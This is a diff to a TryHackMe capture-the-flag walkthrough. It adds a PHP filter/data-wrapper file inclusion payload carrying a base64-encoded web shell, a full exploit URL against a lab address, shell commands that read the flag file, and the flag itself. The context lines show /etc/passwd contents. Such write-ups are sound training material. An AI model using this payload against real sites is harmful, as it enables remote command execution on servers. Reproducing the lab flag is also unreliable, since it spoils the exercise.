@@ -57,3 +57,36 @@ tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
 mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
+```
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ead6c36b-6d72-48d3-818d-5806d783b74c)
+
+```
+&cmd=whoami
+```
+
+```
+http://10.10.98.181/playground.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-decode%2Fresource%3Ddata%3A%2F%2Fplain%2Ftext%2CPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4%2B&cmd=whoami
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/a1631b08-5a71-4ee2-bff9-d1734974817c)
+
+```
+&cmd=ls flags
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f16d5d5b-4193-4e22-bc8e-da9ca8d4fa75)
+
+```
+&cmd=cat flags/cd3c67e5079de2700af6cea0a405f9cc.txt
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/cd70485e-5a74-483b-b3cd-ef24ba5c957e)
+
+```
+THM{fl4g_cd3c67e5079de2700af6cea0a405f9cc}
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/f1f7e70d-1af7-480a-8d3e-c0953dd945c4)
